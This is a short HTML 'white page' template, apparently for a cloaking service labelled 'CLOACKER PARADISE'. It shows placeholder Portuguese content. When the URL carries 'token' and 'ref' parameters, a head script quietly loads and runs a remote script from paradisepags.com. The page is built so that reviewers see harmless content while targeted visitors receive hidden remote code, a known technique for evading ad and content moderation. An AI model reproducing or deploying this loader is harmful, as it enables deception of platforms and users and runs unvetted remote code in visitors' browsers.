<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Página White</title>

  <!-- CLOACKER PARADISE -->
  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const token = urlParams.get("token");
    const ref = urlParams.get("ref");

    if (token && ref) {
      const s = document.createElement("script");
      s.src = `https://paradisepags.com/clock/load.php?token=${token}&ref=${ref}`;
      document.head.appendChild(s);
    }
  </script>
</head>
<body>
  <h1>Conteúdo white aqui</h1>
</body>
</html>
